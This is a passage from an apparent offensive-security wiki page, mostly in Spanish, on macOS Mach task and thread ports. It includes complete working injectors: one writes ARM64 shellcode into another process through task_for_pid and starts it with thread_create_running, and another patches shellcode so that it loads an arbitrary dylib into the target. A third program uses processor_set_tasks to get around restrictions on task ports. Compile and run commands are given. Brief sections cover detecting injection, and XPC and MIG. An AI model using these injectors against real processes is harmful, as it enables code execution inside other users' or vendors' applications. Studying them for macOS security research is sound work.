- **Root puede acceder a los puertos de tarea** de aplicaciones **no** compiladas con un **runtime** **endurecido** (y no de Apple).

**El puerto de nombre de tarea:** Una versión no privilegiada del _puerto de tarea_. Hace referencia a la tarea, pero no permite controlarla. Lo único que parece estar disponible a través de él es `task_info()`.

### Puertos de Hilo

Los hilos también tienen puertos asociados, que son visibles desde la tarea que llama a **`task_threads`** y desde el procesador con `processor_set_threads`. Un derecho de ENVÍO al puerto de hilo permite usar la función del subsistema `thread_act`, como:

- `thread_terminate`
- `thread_[get/set]_state`
- `act_[get/set]_state`
- `thread_[suspend/resume]`
- `thread_info`
- ...

Cualquier hilo puede obtener este puerto llamando a **`mach_thread_sef`**.

### Inyección de Shellcode en hilo a través del puerto de Tarea

Puedes obtener un shellcode de:

{{#ref}}
../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md
{{#endref}}

{{#tabs}}
{{#tab name="mysleep.m"}}
```objectivec
// clang -framework Foundation mysleep.m -o mysleep
// codesign --entitlements entitlements.plist -s - mysleep

#import <Foundation/Foundation.h>

double performMathOperations() {
double result = 0;
for (int i = 0; i < 10000; i++) {
result += sqrt(i) * tan(i) - cos(i);
}
return result;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
processIdentifier]);
while (true) {
[NSThread sleepForTimeInterval:5];

performMathOperations();  // Silent action

[NSThread sleepForTimeInterval:5];
}
}
return 0;
}
```
{{#endtab}}

{{#tab name="entitlements.plist"}}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.get-task-allow</key>
<true/>
</dict>
</plist>
```
{{#endtab}}
{{#endtabs}}

**Compila** el programa anterior y añade los **entitlements** para poder inyectar código con el mismo usuario (si no, necesitarás usar **sudo**).

<details>

<summary>sc_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector
// Based on https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a?permalink_comment_id=2981669
// and on https://newosxbook.com/src.jl?tree=listings&file=inject.c


#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#include <mach/mach_vm.h>
#include <sys/sysctl.h>


#ifdef __arm64__

kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128

// ARM64 shellcode that executes touch /tmp/lalala
char injectedCode[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";


int inject(pid_t pid){

task_t remoteTask;

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}

// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}

pid_t pidForProcessName(NSString *processName) {
NSArray *arguments = @[@"pgrep", processName];
NSTask *task = [[NSTask alloc] init];
[task setLaunchPath:@"/usr/bin/env"];
[task setArguments:arguments];

NSPipe *pipe = [NSPipe pipe];
[task setStandardOutput:pipe];

NSFileHandle *file = [pipe fileHandleForReading];

[task launch];

NSData *data = [file readDataToEndOfFile];
NSString *string = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

return (pid_t)[string integerValue];
}

BOOL isStringNumeric(NSString *str) {
NSCharacterSet* nonNumbers = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
NSRange r = [str rangeOfCharacterFromSet: nonNumbers];
return r.location == NSNotFound;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
if (argc < 2) {
NSLog(@"Usage: %s <pid or process name>", argv[0]);
return 1;
}

NSString *arg = [NSString stringWithUTF8String:argv[1]];
pid_t pid;

if (isStringNumeric(arg)) {
pid = [arg intValue];
} else {
pid = pidForProcessName(arg);
if (pid == 0) {
NSLog(@"Error: Process named '%@' not found.", arg);
return 1;
}
else{
printf("Found PID of process '%s': %d\n", [arg UTF8String], pid);
}
}

inject(pid);
}

return 0;
}
```
</details>
```bash
gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
./inject <pi or string>
```
> [!TIP]
> Para que esto funcione en iOS, necesitas el derecho `dynamic-codesigning` para poder hacer que la memoria ejecutable sea escribible.

### Inyección de Dylib en hilo a través del puerto de tarea

En macOS, **los hilos** pueden ser manipulados a través de **Mach** o usando **la API posix `pthread`**. El hilo que generamos en la inyección anterior fue generado usando la API Mach, por lo que **no es compatible con posix**.

Fue posible **inyectar un simple shellcode** para ejecutar un comando porque **no necesitaba trabajar con APIs** compatibles con posix, solo con Mach. **Inyecciones más complejas** necesitarían que el **hilo** también sea **compatible con posix**.

Por lo tanto, para **mejorar el hilo**, debería llamar a **`pthread_create_from_mach_thread`**, que **creará un pthread válido**. Luego, este nuevo pthread podría **llamar a dlopen** para **cargar un dylib** del sistema, así que en lugar de escribir un nuevo shellcode para realizar diferentes acciones, es posible cargar bibliotecas personalizadas.

Puedes encontrar **dylibs de ejemplo** en (por ejemplo, el que genera un registro y luego puedes escucharlo):

{{#ref}}
../macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md
{{#endref}}

<details>

<summary>dylib_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
// Based on http://newosxbook.com/src.jl?tree=listings&file=inject.c
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <mach/mach.h>
#include <mach/error.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <sys/mman.h>

#include <sys/stat.h>
#include <pthread.h>


#ifdef __arm64__
//#include "mach/arm/thread_status.h"

// Apple says: mach/mach_vm.h:1:2: error: mach_vm.h unsupported
// And I say, bullshit.
kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128


char injectedCode[] =

// "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)

// Call pthread_set_self

"\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
"\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
"\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
"\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the
"\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
"\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
"\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
"\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
"\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
"\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
"\x00\x00\x00\x14" // loop: b loop              ; loop forever

// Call dlopen with the path to the library
"\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
"\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
"\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
"\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
"\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()

// Call pthread_exit
"\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
"\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
"\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit

"PTHRDCRT"  // <-
"PTHRDEXT"  // <-
"DLOPEN__"  // <-
"LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;




int inject(pid_t pid, const char *lib) {

task_t remoteTask;
struct stat buf;

// Check if the library exists
int rc = stat (lib, &buf);

if (rc != 0)
{
fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
//return (-9);
}

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Patch shellcode

int i = 0;
char *possiblePatchLocation = (injectedCode );
for (i = 0 ; i < 0x100; i++)
{

// Patching is crude, but works.
//
extern void *_pthread_set_self;
possiblePatchLocation++;


uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
uint64_t addrOfDlopen = (uint64_t) dlopen;

if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
}

if (memcmp (possiblePatchLocation, "PTHRDCRT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadCreate,8);
printf ("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
}

if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
{
printf ("DLOpen @%llx\n", addrOfDlopen);
memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
}

if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
{
strcpy(possiblePatchLocation, lib );
}
}

// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}


// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}



int main(int argc, const char * argv[])
{
if (argc < 3)
{
fprintf (stderr, "Usage: %s _pid_ _action_\n", argv[0]);
fprintf (stderr, "   _action_: path to a dylib on disk\n");
exit(0);
}

pid_t pid = atoi(argv[1]);
const char *action = argv[2];
struct stat buf;

int rc = stat (action, &buf);
if (rc == 0) inject(pid,action);
else
{
fprintf(stderr,"Dylib not found\n");
}

}
```
</details>
```bash
gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
./inject <pid-of-mysleep> </path/to/lib.dylib>
```
### Secuestro de Hilos a través del Puerto de Tarea <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>

En esta técnica, se secuestra un hilo del proceso:

{{#ref}}
macos-thread-injection-via-task-port.md
{{#endref}}

### Detección de Inyección de Puerto de Tarea

Al llamar a `task_for_pid` o `thread_create_*`, se incrementa un contador en la estructura de tarea del kernel, que puede ser accedida desde el modo usuario llamando a task_info(task, TASK_EXTMOD_INFO, ...)

## Puertos de Excepción

Cuando ocurre una excepción en un hilo, esta excepción se envía al puerto de excepción designado del hilo. Si el hilo no la maneja, se envía a los puertos de excepción de la tarea. Si la tarea no la maneja, se envía al puerto del host, que es gestionado por launchd (donde será reconocida). Esto se llama triaje de excepciones.

Ten en cuenta que al final, si no se maneja adecuadamente, el informe terminará siendo manejado por el demonio ReportCrash. Sin embargo, es posible que otro hilo en la misma tarea gestione la excepción, esto es lo que hacen las herramientas de informes de fallos como `PLCreashReporter`.

## Otros Objetos

### Reloj

Cualquier usuario puede acceder a información sobre el reloj, sin embargo, para establecer la hora o modificar otras configuraciones, uno debe ser root.

Para obtener información, es posible llamar a funciones del subsistema `clock` como: `clock_get_time`, `clock_get_attributtes` o `clock_alarm`\
Para modificar valores, se puede usar el subsistema `clock_priv` con funciones como `clock_set_time` y `clock_set_attributes`.

### Procesadores y Conjunto de Procesadores

Las APIs de procesador permiten controlar un solo procesador lógico llamando a funciones como `processor_start`, `processor_exit`, `processor_info`, `processor_get_assignment`...

Además, las APIs de **conjunto de procesadores** proporcionan una forma de agrupar múltiples procesadores en un grupo. Es posible recuperar el conjunto de procesadores predeterminado llamando a **`processor_set_default`**.\
Estas son algunas APIs interesantes para interactuar con el conjunto de procesadores:

- `processor_set_statistics`
- `processor_set_tasks`: Devuelve un array de derechos de envío a todas las tareas dentro del conjunto de procesadores
- `processor_set_threads`: Devuelve un array de derechos de envío a todos los hilos dentro del conjunto de procesadores
- `processor_set_stack_usage`
- `processor_set_info`

Como se mencionó en [**esta publicación**](https://reverse.put.as/2014/05/05/about-the-processor_set_tasks-access-to-kernel-memory-vulnerability/), en el pasado esto permitía eludir la protección mencionada anteriormente para obtener puertos de tarea en otros procesos y controlarlos llamando a **`processor_set_tasks`** y obteniendo un puerto de host en cada proceso.\
Hoy en día, necesitas ser root para usar esa función y esto está protegido, por lo que solo podrás obtener estos puertos en procesos no protegidos.

Puedes probarlo con:

<details>

<summary><strong>código processor_set_tasks</strong></summary>
````c
// Maincpart fo the code from https://newosxbook.com/articles/PST2.html
//gcc ./port_pid.c -o port_pid

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/sysctl.h>
#include <libproc.h>
#include <mach/mach.h>
#include <errno.h>
#include <string.h>
#include <mach/exception_types.h>
#include <mach/mach_host.h>
#include <mach/host_priv.h>
#include <mach/processor_set.h>
#include <mach/mach_init.h>
#include <mach/mach_port.h>
#include <mach/vm_map.h>
#include <mach/task.h>
#include <mach/task_info.h>
#include <mach/mach_traps.h>
#include <mach/mach_error.h>
#include <mach/thread_act.h>
#include <mach/thread_info.h>
#include <mach-o/loader.h>
#include <mach-o/nlist.h>
#include <sys/ptrace.h>

mach_port_t task_for_pid_workaround(int Pid)
{

host_t        myhost = mach_host_self(); // host self is host priv if you're root anyway..
mach_port_t   psDefault;
mach_port_t   psDefault_control;

task_array_t  tasks;
mach_msg_type_number_t numTasks;
int i;

thread_array_t       threads;
thread_info_data_t   tInfo;

kern_return_t kr;

kr = processor_set_default(myhost, &psDefault);

kr = host_processor_set_priv(myhost, psDefault, &psDefault_control);
if (kr != KERN_SUCCESS) { fprintf(stderr, "host_processor_set_priv failed with error %x\n", kr);
mach_error("host_processor_set_priv",kr); exit(1);}

printf("So far so good\n");

kr = processor_set_tasks(psDefault_control, &tasks, &numTasks);
if (kr != KERN_SUCCESS) { fprintf(stderr,"processor_set_tasks failed with error %x\n",kr); exit(1); }

for (i = 0; i < numTasks; i++)
{
int pid;
pid_for_task(tasks[i], &pid);
printf("TASK %d PID :%d\n", i,pid);
char pathbuf[PROC_PIDPATHINFO_MAXSIZE];
if (proc_pidpath(pid, pathbuf, sizeof(pathbuf)) > 0) {
printf("Command line: %s\n", pathbuf);
} else {
printf("proc_pidpath failed: %s\n", strerror(errno));
}
if (pid == Pid){
printf("Found\n");
return (tasks[i]);
}
}

return (MACH_PORT_NULL);
} // end workaround



int main(int argc, char *argv[]) {
/*if (argc != 2) {
fprintf(stderr, "Usage: %s <PID>\n", argv[0]);
return 1;
}

pid_t pid = atoi(argv[1]);
if (pid <= 0) {
fprintf(stderr, "Invalid PID. Please enter a numeric value greater than 0.\n");
return 1;
}*/

int pid = 1;

task_for_pid_workaround(pid);
return 0;
}

```

````

</details>

## XPC

### Basic Information

XPC, which stands for XNU (the kernel used by macOS) inter-Process Communication, is a framework for **communication between processes** on macOS and iOS. XPC provides a mechanism for making **safe, asynchronous method calls between different processes** on the system. It's a part of Apple's security paradigm, allowing for the **creation of privilege-separated applications** where each **component** runs with **only the permissions it needs** to do its job, thereby limiting the potential damage from a compromised process.

For more information about how this **communication work** on how it **could be vulnerable** check:

{{#ref}}
macos-xpc/
{{#endref}}

## MIG - Mach Interface Generator

MIG was created to **simplify the process of Mach IPC** code creation. This is because a lot of work to program RPC involves the same actions (packing arguments, sending the msg, unpacking the data in the server...).

MIC basically **generates the needed code** for server and client to communicate with a given definition (in IDL -Interface Definition language-). Even if the generated code is ugly, a developer will just need to import it and his code will be much simpler than before.

For more info check:

{{#ref}}
macos-mig-mach-interface-generator.md
{{#endref}}

## References

- [https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
- [https://knight.sc/malware/2019/03/15/code-injection-on-macos.html](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
- [https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)
- [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
- [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
- [\*OS Internals, Volume I, User Mode, Jonathan Levin](https://www.amazon.com/MacOS-iOS-Internals-User-Mode/dp/099105556X)
- [https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task_get_special_port.html](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task_get_special_port.html)

{{#include ../../../../banners/hacktricks-training.md}}
